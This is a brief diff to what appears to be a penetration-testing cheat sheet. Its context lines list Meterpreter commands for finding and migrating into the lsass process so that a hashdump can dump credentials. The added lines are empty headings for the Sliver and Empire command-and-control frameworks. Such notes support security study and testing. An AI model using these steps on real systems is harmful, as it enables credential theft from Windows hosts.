@@ -39,3 +39,7 @@ ps                               # list processes (look for lsass, explorer, etc
 migrate 666                      # migrate to lsass process (PID 666)
 background                       # try and run the 'hashdump' exploit above again
 ```
+
+## Sliver
+
+## Empire
